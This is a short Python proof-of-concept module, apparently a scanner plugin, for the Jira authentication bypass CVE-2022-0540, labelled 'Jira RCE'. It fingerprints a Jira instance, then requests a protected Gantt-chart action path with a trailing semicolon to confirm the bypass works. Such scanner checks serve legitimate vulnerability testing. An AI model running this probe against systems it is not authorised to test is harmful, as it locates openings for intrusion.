from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.critical
        self.detail = """参考链接：<https://github.com/Pear1y/CVE-2022-0540-RCE/blob/main/README_CN.md>"""
        self.name = "Jira RCE"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "atlassian.jira" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        client = Http()
        client.url = urljoin(self.target, "/secure/WBSGanttManageScheduleJobAction.jspa;")
        resp = client.get()
        if "WBS Gantt-Chart" in resp.text:
            return True
        else:
            return False
